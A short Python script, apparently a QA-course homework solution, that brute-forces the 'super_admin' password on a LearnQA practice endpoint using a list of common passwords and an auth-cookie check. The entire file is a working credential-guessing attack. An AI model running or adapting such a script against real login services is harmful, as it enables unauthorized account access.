import requests

passwords = ["password", "123456", "123456789", "12345678", "12345", "qwerty", "abc123", "football", "1234567", "monkey", "111111", "letmein", "1234", "1234567890", "dragon", "baseball", "sunshine", "iloveyou", "trustno1", "princess", "adobe123", "123123", "welcome", "login", "admin", "qwerty123", "1q2w3e4r", "master", "666666", "photoshop", "1qaz2wsx", "qwertyuiop", "ashley", "mustang", "121212", "starwars", "654321", "bailey", "access", "flower", "555555", "passw0rd", "shadow", "lovely", "7777777", "michael", "!@#$%^&*", "jesus", "password1", "superman", "hello", "charlie", "888888", "696969", "hottie", "freedom", "aa123456", "qazwsx", "ninja", "azerty", "solo", "loveme", "whatever", "donald", "batman", "zaq1zaq1", "Football", "000000", "starwars", "qwerty123", "123qwe"]
for password in passwords:
    GetSecretPassword = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={"login":"super_admin", "password":password})
    auth_cookie = GetSecretPassword.cookies.get('auth_cookie')
    CheckCookie = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies={"auth_cookie":auth_cookie})
    if(CheckCookie.text!="You are NOT authorized"):
        print(f"The password is '{password}'")
        print(requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies={"auth_cookie":auth_cookie}).text)
        break